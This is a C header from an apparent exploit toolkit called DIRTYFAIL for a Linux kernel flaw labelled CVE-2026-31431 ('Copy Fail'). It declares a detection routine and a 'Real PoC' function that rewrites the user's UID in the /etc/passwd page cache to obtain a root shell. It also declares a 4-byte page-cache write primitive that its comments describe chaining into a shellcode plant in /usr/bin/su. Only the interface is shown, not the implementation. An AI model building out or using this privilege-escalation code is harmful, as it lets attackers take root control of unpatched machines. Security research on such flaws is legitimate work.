/*
 * DIRTYFAIL — copyfail.h
 *
 * Public surface for the Copy Fail (CVE-2026-31431) module.
 */

#ifndef DIRTYFAIL_COPYFAIL_H
#define DIRTYFAIL_COPYFAIL_H

#include "common.h"

/* Run all preflight checks and the sentinel-file primitive probe.
 * Never modifies system files. */
df_result_t copyfail_detect(void);

/* Real PoC: flip the running user's 4-digit UID in /etc/passwd page
 * cache to "0000" and (optionally) execve `su <user>` to drop a root
 * shell. `do_shell` controls whether to invoke su; if false, the patch
 * is reverted via POSIX_FADV_DONTNEED before returning so the system
 * does not stay in a broken state. */
df_result_t copyfail_exploit(bool do_shell);

/* Low-level building block: write 4 bytes into the page cache of
 * `target_path` at `target_off`. Caller must have read access to
 * the file. Same primitive that copyfail_exploit uses internally;
 * exposed for exploit_su.c to chain ~12 calls into a 48-byte
 * shellcode plant against /usr/bin/su. Returns true if the AF_ALG
 * sequence completed; caller MUST verify via re-read. */
bool cf_4byte_write(const char *target_path,
                    off_t target_off,
                    const unsigned char four_bytes[4]);

#endif
